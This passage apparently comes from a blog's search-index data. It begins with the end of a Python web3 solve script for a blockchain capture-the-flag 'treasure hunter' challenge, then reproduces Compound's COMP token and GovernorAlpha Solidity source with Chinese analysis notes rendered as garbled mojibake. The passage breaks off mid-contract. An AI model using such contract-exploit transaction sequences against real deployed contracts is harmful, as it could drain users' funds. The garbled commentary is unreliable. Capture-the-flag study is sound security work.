1ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\n\n\n\nenter1_txn=contract.functions.enter(enter1).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct1.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned1=acct1.signTransaction(enter1_txn)\ntx_id1=w3.eth.sendRawTransaction(signed1.rawTransaction)\nprint(tx_id1.hex())\nsleep(5)\n\nenter2_txn=contract.functions.enter(enter2).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct2.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned2=acct2.signTransaction(enter2_txn)\ntx_id2=w3.eth.sendRawTransaction(signed2.rawTransaction)\nprint(tx_id2.hex())\nsleep(5)\n\nenter3_txn=contract.functions.enter(enter3).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct3.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned3=acct3.signTransaction(enter3_txn)\ntx_id3=w3.eth.sendRawTransaction(signed3.rawTransaction)\nprint(tx_id3.hex())\nsleep(5)\n\nenter4_txn=contract.functions.enter(enter4).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned4=acct4.signTransaction(enter4_txn)\ntx_id4=w3.eth.sendRawTransaction(signed4.rawTransaction)\nprint(tx_id4.hex())\nsleep(5)\n\npick_txn=contract.functions.pickupTreasureChest(pick).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\npicksigned=acct4.signTransaction(pick_txn)\npick_id=w3.eth.sendRawTransaction(picksigned.rawTransaction)\nprint(pick_id.hex())\nsleep(5)\n\nfind_txn=contract.functions.findKey(find).buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nfindsigned=acct4.signTransaction(find_txn)\nfind_id=w3.eth.sendRawTransaction(findsigned.rawTransaction)\nprint(find_id.hex())\nsleep(5)\n\n\nsolve_txn=contract.functions.openTreasureChest().buildTransaction(&#123;\n\t'nonce':w3.eth.getTransactionCount(acct4.address),\n\t'gas':300000,\n\t'gasPrice':w3.eth.gasPrice\n&#125;)\nsolvesigned=acct4.signTransaction(solve_txn)\nsolve_id=w3.eth.sendRawTransaction(solvesigned.rawTransaction)\nprint(solve_id.hex())\nsleep(5)\n\n\n","slug":"star ctf-treasure hunter","date":"2022-08-01T10:44:08.818Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"c4cf27239136a3939e68273bf6eed499","title":"Compound Governance","content":"\n\n\nGovernance TokenCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\ncontract Comp &#123;\n    /// @notice EIP-20 token name for this token\n    string public constant name = \"Compound\";\n\n    /// @notice EIP-20 token symbol for this token\n    string public constant symbol = \"COMP\";\n\n    /// @notice EIP-20 token decimals for this token\n    uint8 public constant decimals = 18;\n\n    /// @notice Total number of tokens in circulation\n    uint public constant totalSupply = 10000000e18; // 10 million Comp\n\n    /// @notice Allowance amounts on behalf of others\n    mapping (address => mapping (address => uint96)) internal allowances;\n\n    /// @notice Official record of token balances for each account\n    mapping (address => uint96) internal balances;\n\n    /// @notice A record of each accounts delegate\n    mapping (address => address) public delegates;\n\n    /// @notice A checkpoint for marking number of votes from a given block\n    struct Checkpoint &#123;\n        uint32 fromBlock;\n        uint96 votes;\n    &#125;\n\n    /// @notice A record of votes checkpoints for each account, by index\n    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;\n\n    /// @notice The number of checkpoints for each account\n    mapping (address => uint32) public numCheckpoints;\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the delegation struct used by the contract\n    bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\n    /// @notice A record of states for signing / validating signatures\n    mapping (address => uint) public nonces;\n\n    /// @notice An event thats emitted when an account changes its delegate\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n\n    /// @notice An event thats emitted when a delegate account's vote balance changes\n    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);\n\n    /// @notice The standard EIP-20 transfer event\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    /// @notice The standard EIP-20 approval event\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /**\n     * @notice Construct a new Comp token\n     * @param account The initial account to grant all the tokens\n     */\n    constructor(address account) public &#123;\n        balances[account] = uint96(totalSupply);\n        emit Transfer(address(0), account, totalSupply);\n    &#125;\n\n    /**\n     * @notice Get the number of tokens `spender` is approved to spend on behalf of `account`\n     * @param account The address of the account holding the funds\n     * @param spender The address of the account spending the funds\n     * @return The number of tokens approved\n     */\n    function allowance(address account, address spender) external view returns (uint) &#123;\n        return allowances[account][spender];\n    &#125;\n\n    /**\n     * @notice Approve `spender` to transfer up to `amount` from `src`\n     * @dev This will overwrite the approval amount for `spender`\n     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)\n     * @param spender The address of the account which may transfer tokens\n     * @param rawAmount The number of tokens that are approved (2^256-1 means infinite)\n     * @return Whether or not the approval succeeded\n     */\n    function approve(address spender, uint rawAmount) external returns (bool) &#123;\n        uint96 amount;\n        if (rawAmount == type(uint).max) &#123;\n            amount = type(uint96).max;\n        &#125; else &#123;\n            amount = safe96(rawAmount, \"Comp::approve: amount exceeds 96 bits\");\n        &#125;\n\n        allowances[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Get the number of tokens held by the `account`\n     * @param account The address of the account to get the balance of\n     * @return The number of tokens held\n     */\n    function balanceOf(address account) external view returns (uint) &#123;\n        return balances[account];\n    &#125;\n\n    /**\n     * @notice Transfer `amount` tokens from `msg.sender` to `dst`\n     * @param dst The address of the destination account\n     * @param rawAmount The number of tokens to transfer\n     * @return Whether or not the transfer succeeded\n     */\n    function transfer(address dst, uint rawAmount) external returns (bool) &#123;\n        uint96 amount = safe96(rawAmount, \"Comp::transfer: amount exceeds 96 bits\");\n        _transferTokens(msg.sender, dst, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Transfer `amount` tokens from `src` to `dst`\n     * @param src The address of the source account\n     * @param dst The address of the destination account\n     * @param rawAmount The number of tokens to transfer\n     * @return Whether or not the transfer succeeded\n     */\n    function transferFrom(address src, address dst, uint rawAmount) external returns (bool) &#123;\n        address spender = msg.sender;\n        uint96 spenderAllowance = allowances[src][spender];\n        uint96 amount = safe96(rawAmount, \"Comp::approve: amount exceeds 96 bits\");\n\n        if (spender != src &amp;&amp; spenderAllowance != type(uint96).max) &#123;\n            uint96 newAllowance = sub96(spenderAllowance, amount, \"Comp::transferFrom: transfer amount exceeds spender allowance\");\n            allowances[src][spender] = newAllowance;\n\n            emit Approval(src, spender, newAllowance);\n        &#125;\n\n        _transferTokens(src, dst, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Delegate votes from `msg.sender` to `delegatee`\n     * @param delegatee The address to delegate votes to\n     */\n    function delegate(address delegatee) public &#123;\n        return _delegate(msg.sender, delegatee);\n    &#125;\n\n    /**\n     * @notice Delegates votes from signatory to `delegatee`\n     * @param delegatee The address to delegate votes to\n     * @param nonce The contract state required to match the signature\n     * @param expiry The time at which to expire the signature\n     * @param v The recovery byte of the signature\n     * @param r Half of the ECDSA signature pair\n     * @param s Half of the ECDSA signature pair\n     */\n    function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"Comp::delegateBySig: invalid signature\");\n        require(nonce == nonces[signatory]++, \"Comp::delegateBySig: invalid nonce\");\n        require(block.timestamp &lt;= expiry, \"Comp::delegateBySig: signature expired\");\n        return _delegate(signatory, delegatee);\n    &#125;\n\n    /**\n     * @notice Gets the current votes balance for `account`\n     * @param account The address to get votes balance\n     * @return The number of current votes for `account`\n     */\n    function getCurrentVotes(address account) external view returns (uint96) &#123;\n        uint32 nCheckpoints = numCheckpoints[account];\n        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;\n    &#125;\n\n    /**\n     * @notice Determine the prior number of votes for an account as of a block number\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\n     * @param account The address of the account to check\n     * @param blockNumber The block number to get the vote balance at\n     * @return The number of votes the account had as of the given block\n     */\n    function getPriorVotes(address account, uint blockNumber) public view returns (uint96) &#123;\n        require(blockNumber &lt; block.number, \"Comp::getPriorVotes: not yet determined\");\n\n        uint32 nCheckpoints = numCheckpoints[account];\n        if (nCheckpoints == 0) &#123;\n            return 0;\n        &#125;\n\n        // First check most recent balance\n        if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n            return checkpoints[account][nCheckpoints - 1].votes;\n        &#125;\n\n        // Next check implicit zero balance\n        if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n            return 0;\n        &#125;\n\n        uint32 lower = 0;\n        uint32 upper = nCheckpoints - 1;\n        while (upper > lower) &#123;\n            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n            Checkpoint memory cp = checkpoints[account][center];\n            if (cp.fromBlock == blockNumber) &#123;\n                return cp.votes;\n            &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n                lower = center;\n            &#125; else &#123;\n                upper = center - 1;\n            &#125;\n        &#125;\n        return checkpoints[account][lower].votes;\n    &#125;\n\n    function _delegate(address delegator, address delegatee) internal &#123;\n        address currentDelegate = delegates[delegator];\n        uint96 delegatorBalance = balances[delegator];\n        delegates[delegator] = delegatee;\n\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n        _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n    &#125;\n\n    function _transferTokens(address src, address dst, uint96 amount) internal &#123;\n        require(src != address(0), \"Comp::_transferTokens: cannot transfer from the zero address\");\n        require(dst != address(0), \"Comp::_transferTokens: cannot transfer to the zero address\");\n\n        balances[src] = sub96(balances[src], amount, \"Comp::_transferTokens: transfer amount exceeds balance\");\n        balances[dst] = add96(balances[dst], amount, \"Comp::_transferTokens: transfer amount overflows\");\n        emit Transfer(src, dst, amount);\n\n        _moveDelegates(delegates[src], delegates[dst], amount);\n    &#125;\n\n    function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal &#123;\n        if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n            if (srcRep != address(0)) &#123;\n                uint32 srcRepNum = numCheckpoints[srcRep];\n                uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n                uint96 srcRepNew = sub96(srcRepOld, amount, \"Comp::_moveVotes: vote amount underflows\");\n                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n            &#125;\n\n            if (dstRep != address(0)) &#123;\n                uint32 dstRepNum = numCheckpoints[dstRep];\n                uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n                uint96 dstRepNew = add96(dstRepOld, amount, \"Comp::_moveVotes: vote amount overflows\");\n                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n            &#125;\n        &#125;\n    &#125;\n\n    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal &#123;\n      uint32 blockNumber = safe32(block.number, \"Comp::_writeCheckpoint: block number exceeds 32 bits\");\n\n      if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n          checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n      &#125; else &#123;\n          checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n          numCheckpoints[delegatee] = nCheckpoints + 1;\n      &#125;\n\n      emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n    &#125;\n\n    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) &#123;\n        require(n &lt; 2**32, errorMessage);\n        return uint32(n);\n    &#125;\n\n    function safe96(uint n, string memory errorMessage) internal pure returns (uint96) &#123;\n        require(n &lt; 2**96, errorMessage);\n        return uint96(n);\n    &#125;\n\n    function add96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) &#123;\n        uint96 c = a + b;\n        require(c >= a, errorMessage);\n        return c;\n    &#125;\n\n    function sub96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) &#123;\n        require(b &lt;= a, errorMessage);\n        return a - b;\n    &#125;\n\n    function getChainId() internal view returns (uint) &#123;\n        uint256 chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\n\n\nAnalyzeCOMPï¼Œæ˜¯ä¸€ä¸ªä»£è¡¨voteçš„ERC-20ä»£å¸ï¼ŒåŒ…å«äº†ä¸€äº›ç›¸å…³çš„æ²»ç†æ–¹æ³•\nå¤šä½™çš„å°±ä¸åšè¿‡å¤šè§£é‡Šäº†ï¼Œç›´æŽ¥è¿›å…¥æ¯”è¾ƒç‰¹è‰²çš„åœ°æ–¹\nfunction delegate(address delegatee) public &#123;\n    return _delegate(msg.sender, delegatee);\n&#125;\nfunction delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public &#123;\n    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n    bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    address signatory = ecrecover(digest, v, r, s);\n    require(signatory != address(0), \"Comp::delegateBySig: invalid signature\");\n    require(nonce == nonces[signatory]++, \"Comp::delegateBySig: invalid nonce\");\n    require(block.timestamp &lt;= expiry, \"Comp::delegateBySig: signature expired\");\n    return _delegate(signatory, delegatee);\n&#125;\nfunction _delegate(address delegator, address delegatee) internal &#123;\n    address currentDelegate = delegates[delegator];\n    uint96 delegatorBalance = balances[delegator];\n    delegates[delegator] = delegatee;\n\n    emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n    _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n&#125;\n    function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal &#123;\n    if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n        if (srcRep != address(0)) &#123;\n            uint32 srcRepNum = numCheckpoints[srcRep];\n            uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n            uint96 srcRepNew = sub96(srcRepOld, amount, \"Comp::_moveVotes: vote amount underflows\");\n            _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n        &#125;\n\n        if (dstRep != address(0)) &#123;\n            uint32 dstRepNum = numCheckpoints[dstRep];\n            uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n            uint96 dstRepNew = add96(dstRepOld, amount, \"Comp::_moveVotes: vote amount overflows\");\n            _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n        &#125;\n    &#125;\n&#125;\n    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal &#123;\n  uint32 blockNumber = safe32(block.number, \"Comp::_writeCheckpoint: block number exceeds 32 bits\");\n\n  if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n      checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n  &#125; else &#123;\n      checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n      numCheckpoints[delegatee] = nCheckpoints + 1;\n  &#125;\n\n  emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n&#125;\n\nè½¬è´¦æ˜¯æ—¶ä¼šè°ƒç”¨åˆ° moveDelegateså‡½æ•°ï¼ŒåŒæ—¶è°ƒç”¨writeCheckpointå‡½æ•°æ›´æ–°ç¥¨æ•°ã€‚è¯¥éƒ¨åˆ†å‡½æ•°å®žçŽ°äº†å°†æŠ•ç¥¨æƒè¿›è¡Œå§”æ‰˜ã€‚è¢«å§”æ‰˜äººçš„æŠ•ç¥¨æƒå°±æ˜¯è‡ªå·±çš„COPMP+è¢«å§”æ‰˜ç»™çš„COMP\nåˆ¤æ–­æ˜¯å¦åœ¨åŒä¸€blockï¼Œåœ¨åˆ™ç›´æŽ¥åŠ ï¼Œä¸åœ¨åˆ™å°†é•¿åº¦åŠ ä¸€ï¼Œå¯¹åº”æœ€æ–°çš„blockå­˜å‚¨æ–°çš„æ•°æ®\nfunction getPriorVotes(address account, uint blockNumber) public view returns (uint96) &#123;\n    require(blockNumber &lt; block.number, \"Comp::getPriorVotes: not yet determined\");\n\n    uint32 nCheckpoints = numCheckpoints[account];\n    if (nCheckpoints == 0) &#123;\n        return 0;\n    &#125;\n\n    // First check most recent balance\n    if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n        return checkpoints[account][nCheckpoints - 1].votes;\n    &#125;\n\n    // Next check implicit zero balance\n    if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n        return 0;\n    &#125;\n\n    uint32 lower = 0;\n    uint32 upper = nCheckpoints - 1;\n    while (upper > lower) &#123;\n        uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n        Checkpoint memory cp = checkpoints[account][center];\n        if (cp.fromBlock == blockNumber) &#123;\n            return cp.votes;\n        &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n            lower = center;\n        &#125; else &#123;\n            upper = center - 1;\n        &#125;\n    &#125;\n    return checkpoints[account][lower].votes;\n&#125;\n\nä¸ºäº†èŽ·å¾—æŸä¸ªåŒºå—å·ä¸‹çš„æŠ•ç¥¨æƒï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨getPriorVotesæ¥æ£€ç´¢è¯¥å€¼ã€‚è°ƒç”¨æ—¶ä¼šåˆ¤æ–­fromblockæ‰€æœç´¢çš„blocknumberè¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥åªå¯¹äºŽè¿‡åŽ»çš„blocké€‚ç”¨\nGovernance AlphaCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\ncontract GovernorAlpha &#123;\n    /// @notice The name of this contract\n    string public constant name = \"Compound Governor Alpha\";\n\n    /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed\n    function quorumVotes() public pure returns (uint) &#123; return 400000e18; &#125; // 400,000 = 4% of Comp\n\n    /// @notice The number of votes required in order for a voter to become a proposer\n    function proposalThreshold() public pure returns (uint) &#123; return 100000e18; &#125; // 100,000 = 1% of Comp\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    function proposalMaxOperations() public pure returns (uint) &#123; return 10; &#125; // 10 actions\n\n    /// @notice The delay before voting on a proposal may take place, once proposed\n    function votingDelay() public pure returns (uint) &#123; return 1; &#125; // 1 block\n\n    /// @notice The duration of voting on a proposal, in blocks\n    function votingPeriod() virtual public pure returns (uint) &#123; return 17280; &#125; // ~3 days in blocks (assuming 15s blocks)\n\n    /// @notice The address of the Compound Protocol Timelock\n    TimelockInterface public timelock;\n\n    /// @notice The address of the Compound governance token\n    CompInterface public comp;\n\n    /// @notice The address of the Governor Guardian\n    address public guardian;\n\n    /// @notice The total number of proposals\n    uint public proposalCount;\n\n    struct Proposal &#123;\n        /// @notice Unique id for looking up a proposal\n        uint id;\n\n        /// @notice Creator of the proposal\n        address proposer;\n\n        /// @notice The timestamp that the proposal will be available for execution, set once the vote succeeds\n        uint eta;\n\n        /// @notice the ordered list of target addresses for calls to be made\n        address[] targets;\n\n        /// @notice The ordered list of values (i.e. msg.value) to be passed to the calls to be made\n        uint[] values;\n\n        /// @notice The ordered list of function signatures to be called\n        string[] signatures;\n\n        /// @notice The ordered list of calldata to be passed to each call\n        bytes[] calldatas;\n\n        /// @notice The block at which voting begins: holders must delegate their votes prior to this block\n        uint startBlock;\n\n        /// @notice The block at which voting ends: votes must be cast prior to this block\n        uint endBlock;\n\n        /// @notice Current number of votes in favor of this proposal\n        uint forVotes;\n\n        /// @notice Current number of votes in opposition to this proposal\n        uint againstVotes;\n\n        /// @notice Flag marking whether the proposal has been canceled\n        bool canceled;\n\n        /// @notice Flag marking whether the proposal has been executed\n        bool executed;\n\n        /// @notice Receipts of ballots for the entire set of voters\n        mapping (address => Receipt) receipts;\n    &#125;\n\n    /// @notice Ballot receipt record for a voter\n    struct Receipt &#123;\n        /// @notice Whether or not a vote has been cast\n        bool hasVoted;\n\n        /// @notice Whether or not the voter supports the proposal\n        bool support;\n\n        /// @notice The number of votes the voter had, which were cast\n        uint96 votes;\n    &#125;\n\n    /// @notice Possible states that a proposal may be in\n    enum ProposalState &#123;\n        Pending,\n        Active,\n        Canceled,\n        Defeated,\n        Succeeded,\n        Queued,\n        Expired,\n        Executed\n    &#125;\n\n    /// @notice The official record of all proposals ever proposed\n    mapping (uint => Proposal) public proposals;\n\n    /// @notice The latest proposal for each proposer\n    mapping (address => uint) public latestProposalIds;\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the ballot struct used by the contract\n    bytes32 public constant BALLOT_TYPEHASH = keccak256(\"Ballot(uint256 proposalId,bool support)\");\n\n    /// @notice An event emitted when a new proposal is created\n    event ProposalCreated(uint id, address proposer, address[] targets, uint[] values, string[] signatures, bytes[] calldatas, uint startBlock, uint endBlock, string description);\n\n    /// @notice An event emitted when a vote has been cast on a proposal\n    event VoteCast(address voter, uint proposalId, bool support, uint votes);\n\n    /// @notice An event emitted when a proposal has been canceled\n    event ProposalCanceled(uint id);\n\n    /// @notice An event emitted when a proposal has been queued in the Timelock\n    event ProposalQueued(uint id, uint eta);\n\n    /// @notice An event emitted when a proposal has been executed in the Timelock\n    event ProposalExecuted(uint id);\n\n    constructor(address timelock_, address comp_, address guardian_) public &#123;\n        timelock = TimelockInterface(timelock_);\n        comp = CompInterface(comp_);\n        guardian = guardian_;\n    &#125;\n\n    function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n        require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), \"GovernorAlpha::propose: proposer votes below proposal threshold\");\n        require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorAlpha::propose: proposal function information arity mismatch\");\n        require(targets.length != 0, \"GovernorAlpha::propose: must provide actions\");\n        require(targets.length &lt;= proposalMaxOperations(), \"GovernorAlpha::propose: too many actions\");\n\n        uint latestProposalId = latestProposalIds[msg.sender];\n        if (latestProposalId != 0) &#123;\n          ProposalState proposersLatestProposalState = state(latestProposalId);\n          require(proposersLatestProposalState != ProposalState.Active, \"GovernorAlpha::propose: one live proposal per proposer, found an already active proposal\");\n          require(proposersLatestProposalState != ProposalState.Pending, \"GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal\");\n        &#125;\n\n        uint startBlock = add256(block.number, votingDelay());\n        uint endBlock = add256(startBlock, votingPeriod());\n\n        proposalCount++;\n        uint proposalId = proposalCount;\n        Proposal storage newProposal = proposals[proposalId];\n        // This should never happen but add a check in case.\n        require(newProposal.id == 0, \"GovernorAlpha::propose: ProposalID collsion\");\n        newProposal.id = proposalId;\n        newProposal.proposer = msg.sender;\n        newProposal.eta = 0;\n        newProposal.targets = targets;\n        newProposal.values = values;\n        newProposal.signatures = signatures;\n        newProposal.calldatas = calldatas;\n        newProposal.startBlock = startBlock;\n        newProposal.endBlock = endBlock;\n        newProposal.forVotes = 0;\n        newProposal.againstVotes = 0;\n        newProposal.canceled = false;\n        newProposal.executed = false;\n\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n        return newProposal.id;\n    &#125;\n\n    function queue(uint proposalId) public &#123;\n        require(state(proposalId) == ProposalState.Succeeded, \"GovernorAlpha::queue: proposal can only be queued if it is succeeded\");\n        Proposal storage proposal = proposals[proposalId];\n        uint eta = add256(block.timestamp, timelock.delay());\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n        &#125;\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    &#125;\n\n    function _queueOrRevert(address target, uint value, string memory signature, bytes memory data, uint eta) internal &#123;\n        require(!timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))), \"GovernorAlpha::_queueOrRevert: proposal action already queued at eta\");\n        timelock.queueTransaction(target, value, signature, data, eta);\n    &#125;\n\n    function execute(uint proposalId) public payable &#123;\n        require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n        Proposal storage proposal = proposals[proposalId];\n        proposal.executed = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.executeTransaction&#123;value: proposal.values[i]&#125;(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n        emit ProposalExecuted(proposalId);\n    &#125;\n\n    function cancel(uint proposalId) public &#123;\n        ProposalState state = state(proposalId);\n        require(state != ProposalState.Executed, \"GovernorAlpha::cancel: cannot cancel executed proposal\");\n\n        Proposal storage proposal = proposals[proposalId];\n        require(msg.sender == guardian || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold(), \"GovernorAlpha::cancel: proposer above threshold\");\n\n        proposal.canceled = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n\n        emit ProposalCanceled(proposalId);\n    &#125;\n\n    function getActions(uint proposalId) public view returns (address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas) &#123;\n        Proposal storage p = proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    &#125;\n\n    function getReceipt(uint proposalId, address voter) public view returns (Receipt memory) &#123;\n        return proposals[proposalId].receipts[voter];\n    &#125;\n\n    function state(uint proposalId) public view returns (ProposalState) &#123;\n        require(proposalCount >= proposalId &amp;&amp; proposalId > 0, \"GovernorAlpha::state: invalid proposal id\");\n        Proposal storage proposal = proposals[proposalId];\n        if (proposal.canceled) &#123;\n            return ProposalState.Canceled;\n        &#125; else if (block.number &lt;= proposal.startBlock) &#123;\n            return ProposalState.Pending;\n        &#125; else if (block.number &lt;= proposal.endBlock) &#123;\n            return ProposalState.Active;\n        &#125; else if (proposal.forVotes &lt;= proposal.againstVotes || proposal.forVotes &lt; quorumVotes()) &#123;\n            return ProposalState.Defeated;\n        &#125; else if (proposal.eta == 0) &#123;\n            return ProposalState.Succeeded;\n        &#125; else if (proposal.executed) &#123;\n            return ProposalState.Executed;\n        &#125; else if (block.timestamp >= add256(proposal.eta, timelock.GRACE_PERIOD())) &#123;\n            return ProposalState.Expired;\n        &#125; else &#123;\n            return ProposalState.Queued;\n        &#125;\n    &#125;\n\n    function castVote(uint proposalId, bool support) public &#123;\n        return _castVote(msg.sender, proposalId, support);\n    &#125;\n\n    function castVoteBySig(uint proposalId, bool support, uint8 v, bytes32 r, bytes32 s) public &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"GovernorAlpha::castVoteBySig: invalid signature\");\n        return _castVote(signatory, proposalId, support);\n    &#125;\n\n    function _castVote(address voter, uint proposalId, bool support) internal &#123;\n        require(state(proposalId) == ProposalState.Active, \"GovernorAlpha::_castVote: voting is closed\");\n        Proposal storage proposal = proposals[proposalId];\n        Receipt storage receipt = proposal.receipts[voter];\n        require(receipt.hasVoted == false, \"GovernorAlpha::_castVote: voter already voted\");\n        uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n        if (support) &#123;\n            proposal.forVotes = add256(proposal.forVotes, votes);\n        &#125; else &#123;\n            proposal.againstVotes = add256(proposal.againstVotes, votes);\n        &#125;\n\n        receipt.hasVoted = true;\n        receipt.support = support;\n        receipt.votes = votes;\n\n        emit VoteCast(voter, proposalId, support, votes);\n    